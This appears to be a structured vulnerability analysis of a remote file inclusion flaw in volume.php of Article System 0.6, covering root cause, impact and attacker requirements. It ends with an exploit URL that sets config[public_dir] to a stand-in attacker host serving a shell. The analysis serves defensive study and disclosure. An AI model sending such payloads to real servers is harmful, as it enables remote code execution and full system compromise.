**Root cause of vulnerability:**
The vulnerability lies in the `volume.php` file of the Article System 0.6. The file includes another PHP file using a variable named `$config['public_dir']` without proper sanitization. Specifically, it uses the `require` statement: `require "{$config['public_dir']}/templates/html/volume.php" ;`.

**Weaknesses/vulnerabilities present:**
- **Remote File Inclusion (RFI):** The `config['public_dir']` variable is taken directly from user input (through the query string). By manipulating this variable, an attacker can force the server to include and execute a malicious file from a remote location.

**Impact of exploitation:**
- **Arbitrary Code Execution:** By including a remote file containing malicious PHP code, an attacker can execute arbitrary code on the server. This can lead to complete compromise of the application and the underlying system.

**Attack vectors:**
- The attack vector is through an HTTP request to the vulnerable `volume.php` file. The attacker modifies the `config[public_dir]` parameter in the URL to point to a malicious file.

**Required attacker capabilities/position:**
- The attacker needs to be able to send HTTP requests to the vulnerable server.
- They must have a server under their control to host the malicious PHP file.

**Exploit:**
The provided exploit URL is `http://[target]/[path]/volume.php?config[public_dir]=http://evilsite.com/shell?`. This URL demonstrates how an attacker can set the `config['public_dir']` to a malicious remote server and force the vulnerable application to include and execute the content of `http://evilsite.com/shell?`.
